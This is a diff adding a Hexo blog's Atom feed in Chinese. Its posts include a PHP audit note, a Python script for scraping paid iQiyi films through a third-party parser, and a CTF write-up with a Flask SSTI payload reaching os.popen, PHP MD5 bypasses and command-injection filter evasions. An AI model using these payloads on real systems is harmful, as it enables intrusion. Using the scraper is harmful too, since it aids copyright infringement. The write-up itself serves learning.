@@ -1,0 +1,478 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>deleのblog</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2020-03-01T12:25:42.394Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>dele</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>3.1php代码审计-day1</title>
+    <link href="http://yoursite.com/2020/03/01/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-day1/"/>
+    <id>http://yoursite.com/2020/03/01/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-day1/</id>
+    <published>2020-03-01T09:21:58.000Z</published>
+    <updated>2020-03-01T12:25:42.394Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h4 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h4><p>模型，视图，控制器；Model,View,Controller(用户交互);</p><p><img src="/images/3.1-1.png" alt="3.1-1"></p><a id="more"></a><h4 id="常见PHP框架："><a href="#常见PHP框架：" class="headerlink" title="常见PHP框架："></a>常见PHP框架：</h4><p>ThinkPhP，Yaf,laravel,Kohana,Codelgniter,Yii,Snyfony,doitphp;</p><h4 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h4><p><img src="/images/3.1-2.png" alt="3.1-2"></p><h5 id="通读全文："><a href="#通读全文：" class="headerlink" title="通读全文："></a>通读全文：</h5><ul><li><p>函数集文件</p></li><li><p>配置文件</p></li><li><p>安全过滤文件</p></li><li><p>Index文件</p></li></ul><p><img src="/images/3.1-3.png" alt="3.1-3"></p><h5 id="功能点定向审计"><a href="#功能点定向审计" class="headerlink" title="功能点定向审计"></a>功能点定向审计</h5><p>参考网址：<a href="https://www.aqniukt.com/course/11111/task/263097/show" target="_blank" rel="noopener">https://www.aqniukt.com/course/11111/task/263097/show</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;day1&quot;&gt;&lt;a href=&quot;#day1&quot; class=&quot;headerlink&quot; title=&quot;day1&quot;&gt;&lt;/a&gt;day1&lt;/h1&gt;&lt;h4 id=&quot;MVC架构&quot;&gt;&lt;a href=&quot;#MVC架构&quot; class=&quot;headerlink&quot; title=&quot;MVC架构&quot;&gt;&lt;/a&gt;MVC架构&lt;/h4&gt;&lt;p&gt;模型，视图，控制器；Model,View,Controller(用户交互);&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/3.1-1.png&quot; alt=&quot;3.1-1&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用python+视频url解析网站爬下vip电影</title>
+    <link href="http://yoursite.com/2020/02/28/%E5%88%A9%E7%94%A8python-%E8%A7%86%E9%A2%91url%E8%A7%A3%E6%9E%90%E7%BD%91%E7%AB%99%E7%88%AC%E4%B8%8Bvip%E7%94%B5%E5%BD%B1/"/>
+    <id>http://yoursite.com/2020/02/28/%E5%88%A9%E7%94%A8python-%E8%A7%86%E9%A2%91url%E8%A7%A3%E6%9E%90%E7%BD%91%E7%AB%99%E7%88%AC%E4%B8%8Bvip%E7%94%B5%E5%BD%B1/</id>
+    <published>2020-02-28T10:21:12.000Z</published>
+    <updated>2020-02-28T10:33:20.657Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="爬下vip电影"><a href="#爬下vip电影" class="headerlink" title="爬下vip电影"></a>爬下vip电影</h1><p>​    实现这个关键点有两个：</p><p>1.解析网站，</p><p>​    首先上爱奇艺打开电影，ctrl c下url，再用<a href="http://jx.618g.com/?url=&#39;url&#39;" target="_blank" rel="noopener">http://jx.618g.com/?url=&#39;url&#39;</a>;</p><p>F12会发现视频播放其实是由若干的 .ts请求文件接成的视频，所以爬下来就行</p><p>2.直接上代码，多线程+requests</p><a id="more"></a><p>下面是西虹市首富的实例；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://sohu.com-v-sohu.com/20181101/13971_6060c196/1000k/hls/652817bea0d%03d.ts'</span> %i</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    ret = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./video/&#123;&#125;'</span>.format(url[<span class="number">-10</span>:]),<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download2</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://sohu.com-v-sohu.com/20181101/13971_6060c196/1000k/hls/652817bea0d%4d.ts'</span> %i</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    ret = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./video/&#123;&#125;'</span>.format(url[<span class="number">-10</span>:]),<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ret)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    po = Pool(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        po.apply_async(download,args=(i,))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1700</span>):</span><br><span class="line">        po.apply_async(download2,args=(i,))</span><br><span class="line"></span><br><span class="line">    po.close()</span><br><span class="line">    po.join()</span><br></pre></td></tr></table></figure><p>windows下视频合成命令 copy /b *.mp4 video.mp4</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;爬下vip电影&quot;&gt;&lt;a href=&quot;#爬下vip电影&quot; class=&quot;headerlink&quot; title=&quot;爬下vip电影&quot;&gt;&lt;/a&gt;爬下vip电影&lt;/h1&gt;&lt;p&gt;​    实现这个关键点有两个：&lt;/p&gt;
+&lt;p&gt;1.解析网站，&lt;/p&gt;
+&lt;p&gt;​    首先上爱奇艺打开电影，ctrl c下url，再用&lt;a href=&quot;http://jx.618g.com/?url=&amp;#39;url&amp;#39;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://jx.618g.com/?url=&amp;#39;url&amp;#39;&lt;/a&gt;;&lt;/p&gt;
+&lt;p&gt;F12会发现视频播放其实是由若干的 .ts请求文件接成的视频，所以爬下来就行&lt;/p&gt;
+&lt;p&gt;2.直接上代码，多线程+requests&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="实战" scheme="http://yoursite.com/categories/%E5%AE%9E%E6%88%98/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2.26安恒杯月赛wp</title>
+    <link href="http://yoursite.com/2020/02/27/2-26%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwp/"/>
+    <id>http://yoursite.com/2020/02/27/2-26%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwp/</id>
+    <published>2020-02-27T12:25:18.000Z</published>
+    <updated>2020-02-27T14:00:13.893Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="安恒杯月赛wp"><a href="#安恒杯月赛wp" class="headerlink" title="安恒杯月赛wp"></a>安恒杯月赛wp</h1><a id="more"></a><h4 id="web-1-EasyFlask"><a href="#web-1-EasyFlask" class="headerlink" title="web-1:EasyFlask"></a>web-1:EasyFlask</h4><p>​    这题做的时候没头绪，也不咋会做，看了大佬wp也，还不是很明白</p><p>不过后续查找资料就明白了，其实题目已经说了的，只不过以前没涉及到，</p><p>不然看到 flask的那一刻就该明白，考察点在ssti注入；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssti注入又称服务器端模板注入攻击(Server-Side Template Injection)，和sql注入一样，也是由于接受用户输入而造成的安全问题。</span><br><span class="line"></span><br><span class="line">它的实质就是服务器端接受了用户的输入，没有经过过滤或者说过滤不严谨，将用户输入作为web应用模板的一部分，但是在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露，代码执行，getshell等问题。</span><br><span class="line"></span><br><span class="line">这个问题主要是出在web应用模板渲染的过程中，目前比较流行的渲染引擎模板主要有：smarty，twig，jinja2，freemarker，velocity</span><br><span class="line"></span><br><span class="line">而python中的一个微型框架flask主要就是使用的jinja2来作为渲染模板，</span><br><span class="line"></span><br><span class="line">原文链接：https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_39850969/</span>article<span class="regexp">/details/</span><span class="number">86581393</span></span><br></pre></td></tr></table></figure><p>  这里写一下大佬的思路：</p><p>404页面存在flask ssti</p><p>且过滤 ‘.’和’_’</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于过滤点，可以用中括号括起来或者用attr()、getattr()绕过</span><br><span class="line">对于过滤下划线，可以用request[<span class="string">'arg'</span>]绕过，后来glotozz师傅告诉还可用dir(0)[<span class="string">0</span>][<span class="symbol">0</span>]绕过</span><br></pre></td></tr></table></figure><ul><li><code>_mro__</code>会500，要用<code>__base__</code></li><li>用<code>__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code>会500</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10000/&#123;&#123;()|attr(request[<span class="string">'args'</span>][<span class="symbol">'x1'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x2'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x3'</span>])()|attr(request[<span class="string">'args'</span>][<span class="symbol">'x4'</span>])(233)|attr(request[<span class="string">'args'</span>][<span class="symbol">'x5'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x6'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x4'</span>])(request[<span class="string">'args'</span>][<span class="symbol">'x7'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x4'</span>])(request[<span class="string">'args'</span>][<span class="symbol">'x8'</span>])(request[<span class="string">'args'</span>][<span class="symbol">'x9'</span>])&#125;&#125;?x1=<span class="strong">__class__</span>&amp;x2=<span class="strong">__base__</span>&amp;x3=<span class="strong">__subclasses__</span>&amp;x4=<span class="strong">__getitem__</span>&amp;x5=<span class="strong">__init__</span>&amp;x6=<span class="strong">__globals__</span>&amp;x7=<span class="strong">__builtins__</span>&amp;x8=eval&amp;x9=<span class="strong">__import__</span>("os").popen('想要执行的命令').read()</span><br></pre></td></tr></table></figure><p><code>ls /</code>之后发现存在<code>start.sh</code>，然后<code>cat start.sh</code>就行了</p><h4 id="web2-hash"><a href="#web2-hash" class="headerlink" title="web2-hash:"></a>web2-hash:</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$str1 = @$_GET[<span class="string">'str1'</span>];</span></span><br><span class="line"><span class="php">$str2 = @$_GET[<span class="string">'str2'</span>];</span></span><br><span class="line"><span class="php">$str3 = @$_GET[<span class="string">'str3'</span>];</span></span><br><span class="line"><span class="php">$str4 = @$_GET[<span class="string">'str4'</span>];</span></span><br><span class="line"><span class="php">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span></span><br><span class="line"><span class="php">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span></span><br><span class="line"><span class="php">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_POST[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b = $_POST[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php">$m = $_GET[<span class="string">'m'</span>];</span></span><br><span class="line"><span class="php">$n = $_GET[<span class="string">'n'</span>];</span></span><br></pre></td></tr></table></figure><p>这道题很直观，代码审计+md5绕过，碰撞等一系列和md5以及php相关的</p><p>val1和val2 php 弱比较绕过</p><p>val3 和 val4 数组绕过</p><p>val5\6\7,纯粹的MD5碰撞</p><p>这里介绍一个软件，fastcoll，利用之前提出的前缀法破解md5，可以生成值不同但md5值相同的字符串,很强大，比赛就卡在这里，很无奈，不太会用</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\fastcoll&gt;fastcoll_v1.<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>.exe -o <span class="keyword">jlzj0 </span><span class="keyword">jlzj1 </span>     <span class="comment">#-o参数代表随机生成两个相同MD5的文件</span></span><br><span class="line">D:\fastcoll&gt;fastcoll_v1.<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>.exe -p <span class="keyword">jlzj1 </span>-o <span class="keyword">jlzj00 </span><span class="keyword">jlzj01 </span> <span class="comment">#-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> <span class="keyword">jlzj00 </span>&gt; a                <span class="comment">#-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> <span class="keyword">jlzj01 </span>&gt; <span class="keyword">b </span>               <span class="comment">#同理</span></span><br><span class="line">D:\fastcoll&gt;type <span class="keyword">jlzj0 </span>a &gt; <span class="keyword">jlzj10 </span>                   <span class="comment">#这里表示将jlzj0和a文件的内容合并写入jlzj10</span></span><br><span class="line">D:\fastcoll&gt;type <span class="keyword">jlzj0 </span><span class="keyword">b </span>&gt; <span class="keyword">jlzj11 </span>                   <span class="comment">#同理写入jlzj11</span></span><br></pre></td></tr></table></figure><p>生成三个urlencode后赋给5,6,7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(ctype_alnum(<span class="variable">$a</span>)) || (strlen(<span class="variable">$a</span>) &gt; 5) || !(ctype_alnum(<span class="variable">$b</span>)) || (strlen(<span class="variable">$b</span>) &gt; 6)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen(<span class="variable">$m</span>) &gt; 1) || (strlen(<span class="variable">$n</span>) &gt; 1)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$val8</span> = md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$val9</span> = strtr(md5(<span class="variable">$b</span>), <span class="variable">$m</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> PHP_EOL;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;val8 : <span class="variable">$val8</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> PHP_EOL;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;val9 : <span class="variable">$val9</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$val8</span> == <span class="variable">$val9</span>) &amp;&amp; !(<span class="variable">$a</span> === <span class="variable">$b</span>) &amp;&amp; (strlen(<span class="variable">$b</span>) === 5)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="string">'./flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>val8 和 val9 还是弱比较，然后val9 又可以通过m,n替换钱两位，而且要求全数字ctype_alnum($a、$b)</p><p>这里爆破$a，和$b就行</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">import</span> <span class="string">hashlib</span></span><br><span class="line"><span class="attr">def</span> <span class="string">findA():</span></span><br><span class="line"><span class="attr">alphabet</span> = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span></span><br><span class="line"><span class="attr">for</span> <span class="string">a in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">b in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">c in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">d in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">e in alphabet:</span></span><br><span class="line"><span class="attr">payload</span> = <span class="string">(a+b+c+d+e).encode()</span></span><br><span class="line"><span class="attr">md5</span> = <span class="string">hashlib.md5(payload)</span></span><br><span class="line"><span class="attr">value</span> = <span class="string">md5.hexdigest()</span></span><br><span class="line"><span class="attr">pre</span> = <span class="string">value[0:2]</span></span><br><span class="line"><span class="attr">last</span> = <span class="string">value[2:32]</span></span><br><span class="line"><span class="attr">if</span> <span class="string">pre == '0e' and last.isdigit():</span></span><br><span class="line"><span class="meta">print('successful</span> <span class="string">A found!! &#123;&#125; \'s md5=&#123;&#125;'.format(payload, value))</span></span><br><span class="line"><span class="attr">return</span></span><br><span class="line"><span class="attr">def</span> <span class="string">findB():</span></span><br><span class="line"><span class="attr">alphabet</span> = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span></span><br><span class="line"><span class="attr">for</span> <span class="string">a in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">b in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">c in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">d in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">e in alphabet:</span></span><br><span class="line"><span class="attr">payload</span> = <span class="string">(a+b+c+d+e).encode()</span></span><br><span class="line"><span class="attr">md5</span> = <span class="string">hashlib.md5(payload)</span></span><br><span class="line"><span class="attr">value</span> = <span class="string">md5.hexdigest()</span></span><br><span class="line"><span class="attr">pre</span> = <span class="string">value[1:2]</span></span><br><span class="line"><span class="attr">last</span> = <span class="string">value[2:32]</span></span><br><span class="line"><span class="attr">if</span>  <span class="string">pre == 'e' and last.isdigit():</span></span><br><span class="line"><span class="meta">print('successful</span> <span class="string">B found! &#123;&#125; \'s md5=&#123;&#125;'.format(payload, value))</span></span><br><span class="line"><span class="attr">return</span></span><br><span class="line"></span><br><span class="line"><span class="attr">if</span> <span class="string">__name__ == '__main__':</span></span><br><span class="line"><span class="attr">findA()</span></span><br><span class="line"><span class="attr">findB()</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/30J2PH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/27/30J2PH.png" alt="30J2PH.png"></a></p><p>最后payload:</p><p>m n 要能替换成0e</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span> m=<span class="number">7</span><span class="variable">&amp;n</span>=<span class="number">0</span></span><br><span class="line"><span class="symbol">POST:</span> a=byGcY<span class="variable">&amp;b</span>=aegsO</span><br></pre></td></tr></table></figure><h4 id="web-3-commix"><a href="#web-3-commix" class="headerlink" title="web-3 commix"></a>web-3 commix</h4><p>  本来网页直接打开就是命令执行，不过后面页面被搞没了；</p><p>主要过滤了cat和flag;</p><p>用内联执行+读取+拼接字</p><p>有以下这些</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">more `ls` </span><br><span class="line">tail `ls`</span><br><span class="line">less `ls`</span><br><span class="line">head `ls`</span><br><span class="line">tac `ls` </span><br><span class="line">rev `ls` | rev</span><br></pre></td></tr></table></figure><p>发现flag文件，拼接命令之后</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="bash">=a=t;ca<span class="variable">$a</span> <span class="string">'ls'</span></span></span><br></pre></td></tr></table></figure><p>参考网址：</p><p><a href="https://www.gem-love.com/ctf/1799.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1799.html</a></p><p><a href="https://xz.aliyun.com/t/4741#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/4741#toc-7</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;安恒杯月赛wp&quot;&gt;&lt;a href=&quot;#安恒杯月赛wp&quot; class=&quot;headerlink&quot; title=&quot;安恒杯月赛wp&quot;&gt;&lt;/a&gt;安恒杯月赛wp&lt;/h1&gt;
+    
+    </summary>
+    
+    
+      <category term="web" scheme="http://yoursite.com/categories/web/"/>
+    
+    
+      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>http协议-url 构成</title>
+    <link href="http://yoursite.com/2020/02/23/http%E5%8D%8F%E8%AE%AE-url-%E6%9E%84%E6%88%90/"/>
+    <id>http://yoursite.com/2020/02/23/http%E5%8D%8F%E8%AE%AE-url-%E6%9E%84%E6%88%90/</id>
+    <published>2020-02-23T11:48:34.000Z</published>
+    <updated>2020-02-27T14:01:06.622Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p><p><strong>2.</strong>域名部分：该URL的域名部分为“<a href="http://www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用" target="_blank" rel="noopener">www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</a></p><p><strong>3.</strong>端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p> <a id="more"></a><p><strong>4.</strong>虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p><p><strong>5.</strong>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p><p><strong>6.</strong>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p><p><strong>7.</strong>参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt;域名部分：该URL的域名部分为“&lt;a href=&quot;http://www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用&lt;/a&gt;&lt;/p&gt;
